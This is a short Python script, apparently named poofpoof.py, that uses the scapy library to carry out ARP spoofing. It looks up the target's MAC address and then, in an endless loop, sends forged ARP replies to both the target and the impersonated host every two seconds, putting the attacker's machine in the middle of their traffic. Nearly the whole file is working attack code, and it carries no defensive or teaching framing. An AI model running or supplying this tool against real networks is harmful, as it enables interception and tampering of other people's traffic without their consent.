#!/usr/bin/python3

import scapy.all as scapy
import argparse
import time

def get_input():
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", "--target", dest="target_ip", help="Mention the target IP address using -t or --target flag.\n Syntax: python3 poofpoof.py -t 'IP here'")
	parser.add_argument("-m", "--mac", dest="target_mac", help="Mention the target MAC address using -m or --mac flag.\n Syntax: python3 poofpoof.py -m 'MAC here'")
	parser.add_argument("-s", "--srcip", dest="spoof_ip", help="Mention the IP address of the source machine, from whom the packet should seem to be coming from using -s or --srcip flag.\n Syntax: python3 poofpoof.py -s 'IP here'")
	options = parser.parse_args()
	return options
	
def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	combined_request = broadcast/arp_request
	answered_list = scapy.srp(combined_request, timeout=1, verbose=False)[0]
	return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet)
	
options = get_input()	
while True:
	spoof(options.target_ip, options.spoof_ip)
	spoof(options.spoof_ip, options.target_ip)
	time.sleep(2)
